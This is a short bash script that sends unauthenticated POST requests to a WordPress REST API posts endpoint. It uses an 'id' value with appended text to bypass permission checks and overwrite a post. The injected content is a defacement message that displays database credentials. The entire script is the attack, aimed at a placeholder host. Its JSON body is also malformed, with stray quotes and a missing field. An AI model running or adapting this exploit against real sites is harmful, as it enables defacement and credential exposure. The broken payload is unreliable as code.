#!/bin/bash 
arry=(23004 22992 22978 22969 22958 22948 22933 22913 22891 22878) 
for m in ${arry[@]}; do
  curl -X POST 'http://www.url.com/blog/index.php/wp-json/wp/v2/posts/8580' \
    -H "Content-Type: application/json" \
    --data "{\"id\" : \"$m justrawdata\",\"title\": \\"content\": \"<h1>This is what we call, Epic Security Failure</h1><br>your database configuration details are :: <br>db name :: lr_blog <br> db-user :: root<br>DB_Password : root1234 <br>\"h"}
done

